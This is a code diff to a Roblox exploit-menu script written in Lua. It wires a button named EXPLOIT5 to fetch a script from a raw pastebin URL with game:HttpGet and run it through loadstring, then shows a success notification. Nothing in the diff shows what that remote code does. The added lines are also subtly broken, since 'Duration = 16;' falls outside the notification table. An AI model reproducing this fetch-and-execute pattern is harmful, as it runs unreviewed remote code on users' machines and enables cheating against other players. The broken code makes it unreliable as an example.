@@ -212,12 +212,18 @@ EXPLOIT5.BackgroundColor3 = Color3.fromRGB(68, 68, 68)
 EXPLOIT5.Position = UDim2.new(0.352518022, 0, 0.345625222, 0)
 EXPLOIT5.Size = UDim2.new(0, 70, 0, 32)
 EXPLOIT5.Font = Enum.Font.Gotham
-EXPLOIT5.Text = "Soon" 
+EXPLOIT5.Text = "Peterating Underground" 
 EXPLOIT5.TextColor3 = Color3.fromRGB(255, 255, 255)
 EXPLOIT5.TextScaled = true
 EXPLOIT5.TextSize = 14.000
 EXPLOIT5.TextWrapped = true
 EXPLOIT5.MouseButton1Down:connect(function()
+loadstring(game:HttpGet('https://pastebin.com/raw/QKbzxzSj'))()
+game:GetService("StarterGui"):SetCore("SendNotification", { 
+	Title = "Script:";
+	Text = "Successfully Executed Peterating Underground!";
+	Icon = "rbxthumb://type=Asset&id=9408318893&w=150&h=150"})
+Duration = 16;
 end)
 
 UICorner_15.Parent = EXPLOIT5
